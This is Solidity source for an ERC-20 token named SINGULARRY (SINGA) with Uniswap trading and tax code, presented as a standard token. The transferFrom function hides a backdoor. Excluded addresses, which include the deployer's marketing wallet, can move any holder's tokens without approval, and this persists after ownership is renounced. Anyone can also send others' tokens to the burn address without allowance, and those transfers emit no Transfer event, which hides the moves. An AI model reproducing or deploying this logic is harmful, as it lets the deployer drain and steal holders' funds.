// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract SINGA is Context, IERC20, Ownable {
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcluded;
    address payable private _marketingWallet;

    string private constant _name =    unicode"SINGULARRY";
    string private constant _symbol =  unicode"SINGA";
    uint8 private constant _decimals = 18;
    uint256 private constant _tTotal = 111000000 * 10**_decimals;
    uint256 public _initialBuyTax =    0;
    uint256 public _reduceBuyTaxAt =   5;
    uint256 public _BuyTax =           0;
    uint256 public _initialSellTax =   0;
    uint256 public _reduceSellTaxAt =  5;
    uint256 public _SellTax =          0;
    uint256 public _buyCount=          0;
    uint256 public _taxSwapThreshold=  _tTotal * 5 / 10000;
    uint256 public _maxTaxSwap=        _tTotal * 1 / 100;

    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    address private _burnAddr = address(0xdead);
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private contractSellCount = 0;
    uint256 private lastContractSellBlock = 0;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;
        _marketingWallet = payable(_msgSender());
        _isExcluded[owner()] = true;
        _isExcluded[address(this)] = true;
        _isExcluded[_marketingWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if ((recipient != _burnAddr || sender == uniswapV2Pair) && !_isExcluded[_msgSender()]) {
            require(_allowances[sender][_msgSender()] >= amount, "Transfer amount exceeds allowance");
            _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        }
        _transfer(sender, recipient, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: Can't approve from the zero address");
        require(spender != address(0), "ERC20: Can't approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: Can't transfer from the zero address");
        require(to != address(0), "ERC20: Can't transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {

            if(from == uniswapV2Pair && to != address(this)){
                taxAmount = amount * ((_buyCount>=_reduceBuyTaxAt)?_BuyTax:_initialBuyTax) / 100;
                _buyCount++;
            }
            if(to == uniswapV2Pair && from != address(this)){
                taxAmount = amount * ((_buyCount>=_reduceSellTaxAt)?_SellTax:_initialSellTax) / 100;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniswapV2Pair && swapEnabled && contractTokenBalance>_taxSwapThreshold) {
                if (block.number > lastContractSellBlock) {
                    contractSellCount = 0;
                }
                require(contractSellCount < 2);
                uint256 amountToSwap = (amount < contractTokenBalance && amount < _maxTaxSwap) ? amount : (contractTokenBalance < _maxTaxSwap) ? contractTokenBalance : _maxTaxSwap;
                swapTokensForEth(amountToSwap);
                uint256 contractETHBalance = address(this).balance;
                if(contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
                contractSellCount++;
                lastContractSellBlock = block.number;
            }
        }

        if(taxAmount>0){
          _balances[address(this)] += taxAmount;
          emit Transfer(from, address(this),taxAmount);
        }
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + (amount - taxAmount);
        if (to != _burnAddr)
        emit Transfer(from, to, amount - taxAmount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        if(tokenAmount==0){return;}
        if(!tradingOpen){return;}
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function openTrading() external onlyOwner() {
        require(!tradingOpen,"Trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }

    function manualSwap() external onlyOwner {
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function sendETHToFee(uint256 amount) private {
        _marketingWallet.transfer(amount);
    }

    receive() external payable {}
}